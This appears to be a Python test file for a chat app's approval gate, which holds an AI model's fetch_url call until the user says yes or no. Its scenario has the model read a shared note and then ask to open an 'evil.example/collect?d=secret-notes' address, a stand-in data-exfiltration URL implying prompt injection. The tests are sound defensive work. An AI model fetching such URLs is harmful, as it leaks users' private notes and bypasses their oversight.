"""A held page-open stops the reply at its card and waits (chat/holds.py).

Yes runs the call and the model carries on with the page; no tells the model
so. Nobody answering, a Stop, or a page that can't show the card all fall
back to the card on the saved reply, decided through approvals.py as before.
"""
from __future__ import annotations

import asyncio
import json

import pytest

from app.chat import holds
from tests.test_chat_holds import _call, _shared_note
from tests.test_chat_reliability import _enqueue, _replies, _start_session, _until
from tests.test_chat_streaming import _seed_turn

EVIL = "https://evil.example/collect?d=secret-notes"
PAGE = "<html><head><title>Guide</title></head><body><p>" + "The pad costs twenty dollars. " * 30 + "</p></body></html>"


class _Resp:
    is_success = True
    status_code = 200
    url = EVIL
    text = PAGE


def _fetching(monkeypatch) -> list[str]:
    from app.chat.tools import fetch_url as mod

    fetched: list[str] = []

    async def _fetch(method, url, **kw):
        fetched.append(url)
        return _Resp()

    monkeypatch.setattr(mod, "safe_fetch", _fetch)
    return fetched


async def _begin(monkeypatch, db, user, conversation, urls=(EVIL,), *, can_ask=True):
    """Start a turn that read a shared note and then asks to open ``urls``."""
    from app.models_config.provider import FinishEvent, TextDelta, ToolCallDelta

    await _shared_note(db, user, conversation)
    msg = await _seed_turn(db, conversation)
    msg.content = "What does the note say?"
    await db.commit()
    stream_id = await _enqueue(conversation, msg, tools_enabled=True, web_search_mode="auto")
    hops: list[dict] = []

    async def _stream(**kwargs):
        hops.append(kwargs)
        if len(hops) == 1:
            for i, url in enumerate(urls):
                yield ToolCallDelta(index=i, id=f"call_{i + 1}", name="fetch_url", arguments=json.dumps({"url": url}))
            yield FinishEvent(reason="tool_calls")
            return
        yield TextDelta(text="Okay.")
        yield FinishEvent(reason="stop")

    session = await _start_session(monkeypatch, user, conversation, stream_id, _stream)
    session.can_ask = can_ask
    return session, hops


def _waiting(conversation, call_id="call_1") -> bool:
    return (str(conversation.id), call_id) in holds._WAITING


def _tool_text(hops: list[dict], call_id="call_1") -> str:
    # Later calls (the title) follow the reply's own hops.
    for hop in reversed(hops):
        for m in hop["messages"]:
            role = m.get("role") if isinstance(m, dict) else getattr(m, "role", None)
            tcid = m.get("tool_call_id") if isinstance(m, dict) else getattr(m, "tool_call_id", None)
            if role == "tool" and tcid == call_id:
                return str(m.get("content") if isinstance(m, dict) else m.content)
    raise AssertionError("no tool result")


@pytest.mark.asyncio
async def test_yes_opens_it_and_the_reply_uses_the_page(db, user, conversation, monkeypatch):
    fetched = _fetching(monkeypatch)
    session, hops = await _begin(monkeypatch, db, user, conversation)
    await _until(lambda: _waiting(conversation))
    assert fetched == [] and len(hops) == 1  # nothing ran, the model is waiting
    sse = "".join(session.events)
    assert '"tool_ask"' in sse and "Open evil.example?" in sse

    assert holds.answer(conversation.id, "call_1", True) is True
    assert holds.answer(conversation.id, "call_1", True) is False  # the first answer is the only one
    await _until(lambda: session.done)
    assert fetched == [EVIL]
    assert "twenty dollars" in _tool_text(hops)
    reply = (await _replies(conversation))[-1]
    meta = _call(reply, "fetch_url")["meta"]
    assert meta["approval"] == "approved" and meta["answered"] == "live"
    assert "result" not in meta and not meta.get("show_result")  # in the reply, not dumped on the card
    assert len([c for c in reply.tool_calls if c["id"] == "call_1"]) == 1
    assert not holds._WAITING


@pytest.mark.asyncio
async def test_no_tells_the_model_and_nothing_is_opened(db, user, conversation, monkeypatch):
    fetched = _fetching(monkeypatch)
    session, hops = await _begin(monkeypatch, db, user, conversation)
    await _until(lambda: _waiting(conversation))
    assert holds.answer(conversation.id, "call_1", False) is True
    await _until(lambda: session.done)
    assert fetched == []
    assert holds.DECLINED_NOTE in _tool_text(hops)
    meta = _call((await _replies(conversation))[-1], "fetch_url")["meta"]
    assert meta["approval"] == "declined"


@pytest.mark.asyncio
async def test_nobody_answers_falls_back_to_the_card_on_the_reply(db, user, conversation, monkeypatch):
    from app.chat.approvals import decide

    fetched = _fetching(monkeypatch)
    monkeypatch.setattr(holds, "PAUSE_SECONDS", 0.3)
    monkeypatch.setattr(holds, "PAUSE_MIN_SECONDS", 0.3)
    session, hops = await _begin(monkeypatch, db, user, conversation)
    await _until(lambda: session.done)
    assert fetched == [] and not holds._WAITING
    assert "approval card" in _tool_text(hops)
    reply = (await _replies(conversation))[-1]
    assert _call(reply, "fetch_url")["meta"]["approval"] == "pending"
    assert holds.answer(conversation.id, "call_1", True) is False
    # ...where a later yes works as it always did.
    decision = await decide(db, user, reply.id, "call_1", True)
    assert decision.outcome == "approved" and fetched == [EVIL]
    assert decision.call["meta"]["show_result"] is True


@pytest.mark.asyncio
async def test_stopping_while_it_waits_keeps_the_card(db, user, conversation, monkeypatch):
    from app.chat.stream_runner import stop_session

    fetched = _fetching(monkeypatch)
    session, _hops = await _begin(monkeypatch, db, user, conversation)
    await _until(lambda: _waiting(conversation))
    await stop_session(session, done_event='data: {"done": true}\n\n')
    await _until(lambda: not holds._WAITING)
    assert fetched == []
    reply = (await _replies(conversation))[-1]
    assert _call(reply, "fetch_url")["meta"]["approval"] == "pending"


@pytest.mark.asyncio
async def test_a_page_that_cannot_show_the_card_is_not_waited_on(db, user, conversation, monkeypatch):
    fetched = _fetching(monkeypatch)
    session, _hops = await _begin(monkeypatch, db, user, conversation, can_ask=False)
    await asyncio.wait_for(_until(lambda: session.done), 5)
    assert fetched == [] and '"tool_ask"' not in "".join(session.events)
    assert _call((await _replies(conversation))[-1], "fetch_url")["meta"]["approval"] == "pending"


@pytest.mark.asyncio
async def test_two_held_opens_show_both_cards_at_once(db, user, conversation, monkeypatch):
    fetched = _fetching(monkeypatch)
    other = "https://other.example/x?d=more"
    session, hops = await _begin(monkeypatch, db, user, conversation, urls=(EVIL, other))
    await _until(lambda: _waiting(conversation, "call_1") and _waiting(conversation, "call_2"))
    # Answered out of order: the second first.
    assert holds.answer(conversation.id, "call_2", False)
    assert holds.answer(conversation.id, "call_1", True)
    await _until(lambda: session.done)
    assert fetched == [EVIL]
    assert "twenty dollars" in _tool_text(hops, "call_1") and holds.DECLINED_NOTE in _tool_text(hops, "call_2")
    reply = (await _replies(conversation))[-1]
    states = {c["id"]: c["meta"]["approval"] for c in reply.tool_calls if c["name"] == "fetch_url"}
    assert states == {"call_1": "approved", "call_2": "declined"}


@pytest.mark.asyncio
async def test_only_the_person_whose_chat_it_is_can_answer(db, user, conversation, monkeypatch):
    from fastapi import HTTPException

    from app.auth.models import User
    from app.chat.approvals_router import ApprovalRequest, answer_waiting_call

    _fetching(monkeypatch)
    session, _hops = await _begin(monkeypatch, db, user, conversation)
    await _until(lambda: _waiting(conversation))
    stranger = User(id=__import__("uuid").uuid4(), username="stranger")
    with pytest.raises(HTTPException) as e:
        await answer_waiting_call(conversation.id, "call_1", ApprovalRequest(approve=True), db=db, user=stranger)
    assert e.value.status_code == 404 and _waiting(conversation)
    assert await answer_waiting_call(conversation.id, "call_1", ApprovalRequest(approve=False), db=db, user=user) == {"ok": True}
    with pytest.raises(HTTPException) as e:
        await answer_waiting_call(conversation.id, "call_1", ApprovalRequest(approve=True), db=db, user=user)
    assert e.value.status_code == 409
    await _until(lambda: session.done)
